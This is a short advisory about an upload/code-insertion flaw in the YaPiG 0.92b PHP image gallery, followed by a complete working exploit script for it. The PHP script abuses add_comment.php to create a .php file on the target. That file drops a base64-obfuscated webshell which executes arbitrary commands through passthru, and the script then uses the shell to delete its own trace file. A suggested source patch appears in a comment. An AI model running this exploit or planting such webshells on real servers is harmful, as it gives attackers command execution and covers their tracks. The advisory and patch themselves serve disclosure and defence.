source: http://www.securityfocus.com/bid/10891/info

A vulnerability is reported to exist in YaPiG that may allow a remote attacker to execute malicious scripts on a vulnerable system. This issue exists due to a lack if sanitization of user-supplied data.

It is reported that an attacker may be able to upload content that will be saved on the server with a '.php' extension. When this file is requested by the attacker, the contents of the file will be parsed and executed by the PHP engine, rather than being sent.

Successful exploitation of this issue may allow an attacker to execute malicious script code on a vulnerable server.

Version 0.92b is reported vulnerable to this issue. Other versions may also be affected.

#!/usr/bin/php

<?

/*

        YaPiG 0.92b add_coment PHP Insertion Proof of Concept
        By aCiDBiTS    acidbits@hotmail.com    07-August-2004


        Description:

        YaPiG (http://yapig.sourceforge.net/) is a PHP Image Gallery script.
        This Proof of Concept creates a small webshell script in the server
        that we can use to exec commands in the server.
        First it determines a valid photo directory where to create the script.
        Then creates a crafted comment saved in a new .php file. This comment
        contains an encoded webshell.   Once this .php file is opened, the code
        contained creates acidwebshell.php.

        Usage (in my debian box):
        php4 -q yapig_addc_poc.php "http://127.0.0.1/yapig-0.92b"


        Vulnerability:

        There is no user input sanization in some parameters of add_comment.php.
        This allows to create a file with the extension that we want, and we can
        insert any code in it.Version 0.92b is vulnerable, I haven't tested
        older ones.


        Workaround. Modify this lines of code:

        add_comment.php
        line 105:
                $comments_file= $gid_dir . $gid . "_" . $phid;
        Modify with:
                $comments_file= $gid_dir . $gid . "_" . intval($phid);

        functions.php, construct_comment_line()
        line 699-700:
                $linea=$linea . $data_array['mail'] . $SEPARATOR;
                $linea=$linea . $data_array['web'] . $SEPARATOR;
        Modify with:
                $linea=$linea . htmlspecialchars($data_array['mail']) . $SEPARATOR;
                $linea=$linea . htmlspecialchars($data_array['web']) . $SEPARATOR;

*/


echo "+-------------------------------------------------------+\n| YaPiG 0.92b add_coment PHP Insertion Proof of
+Concept |\n| By aCiDBiTS    acidbits@hotmail.com    07-August-2004
+|\n+-------------------------------------------------------+\n\n";

/*  This is my webshell script generator. It contains the webshell encoded
        to avoid magic_quotes and urldecode altering the content of the script. */
$websh="<?php \$f=fopen(trim(base64_decode(YWNpZHdlYnNoZWxsLnBocCAg)),w);fputs(\$f,trim(base64_decode(IDxodG1sPjxoZWFkPjx0aXRsZT5hQ2lEQmlUUyBXZWJTaGVsbCA8L3RpdGxlPjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PWlzby04ODU5LTEiPjwvaGVhZD4NCjxib2R5PjxoMj5hQ2lEQmlUUyBXZWJTaGVsbCB2MS4wPC9oMj4gPGZvcm0gbmFtZT0iZjEiIG1ldGhvZD0icG9zdCIgYWN0aW9uPSJhY2lkd2Vic2hlbGwucGhwIj4gIENvbW1hbmQ6ICANCjxpbnB1dCBuYW1lPSJjIiB0eXBlPSJ0ZXh0IiBpZD0iYyIgc2l6ZT0iMzAiPjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFeGVjdXRlIj4gPC9mb3JtPjxicj4gDQo8dGFibGUgd2lkdGg9IjEwMCUiICBib3JkZXI9IjEiIGNlbGxwYWRkaW5nPSIzIj4gPHRyPjx0ZD48PyAkYz0kX1BPU1RbJ2MnXTsgaWYoaXNzZXQoJGMpKSAgeyBlY2hvICI8cHJlPiI7ZWNobyBubDJicihwYXNzdGhydSgkYykpLiI8L3ByZT4iOw0KfSBlbHNlIHtlY2hvICJQbGVhc2UgZW50ZXIgY29tbWFuZCB0byBleGVjdXRlLiBFZzogbHMiO30gPz4gPC90ZD4gPC90cj48L3RhYmxlPiBUaGlzIHNjcmlwdCBpcyBmb3IgZWR1Y2F0aW9uYWwgcHVycG9zZXMuIEknbSBub3QgcmVzcG9uc2FibGUgDQpmb3IgYW55IGlsZWdhbCBhY3Rpb24gcHJvZHVjZWQgYnkgaXRzIHVzZS4gPGEgaHJlZj0ibWFpbHRvOmFjaWRiaXRzQGhvdG1haWwuY29tIj5hQ2lEQmlUUzwvYT4gPC9ib2R5PjwvaHRtbD4g)));fclose(\$f); ?>";

if($argc<2)     die("Usage: ".$argv[0]." URL_to_YaPiG_script\n\n");
$host=$argv[1];
if(substr($host,strlen($host)-1,1)!='/') $host.='/';

echo "[+] Getting valid gid & photo path ... ";
$webc=get_web($host);
$temp=explode(";gid=",$webc);
$gid=intval($temp[1]);
$temp=explode("photos/",$webc);
$temp=explode("/",$temp[1]);
$path=$temp[0];
if( !$gid || !$path ) die( "Failed!\n\n");
echo "OK\n    GID: $gid\n    Path: ".$host."photos/".$path."/\n\n";

echo "[+] Creating WebShell Script ... ";

send_post( $host."add_comment.php?gid=".$gid."&phid=.php", "tit=a&aut=a&mail=".urlencode($websh)."&web=&msg=a&date=&send=Send");
$webc=get_web( $host."photos/".$path."/".$gid."_.php" );
send_post( $host."photos/".$path."/acidwebshell.php", "c=".urlencode("rm ".$gid."_.php") );
echo "OK\n    Now go to: ".$host."photos/".$path."/acidwebshell.php";


die("\n\nDone!\n\n");


function get_web($url)
{
        $ch=curl_init();
        curl_setopt ($ch, CURLOPT_URL, $url);
        curl_setopt ($ch, CURLOPT_HEADER, 0);
        curl_setopt ($ch, CURLOPT_RETURNTRANSFER,1);
        $data=curl_exec ($ch);
        curl_close ($ch);
        return $data;
}

function send_post($url,$data)
{
        $ch=curl_init();
        curl_setopt ($ch, CURLOPT_URL, $url );
        curl_setopt ($ch, CURLOPT_HEADER, 0);
        curl_setopt ($ch, CURLOPT_RETURNTRANSFER,1);
        curl_setopt ($ch, CURLOPT_POST, 1);
        curl_setopt ($ch, CURLOPT_POSTFIELDS, $data );
        $data=curl_exec ($ch);
        curl_close ($ch);
        return $data;
}

?>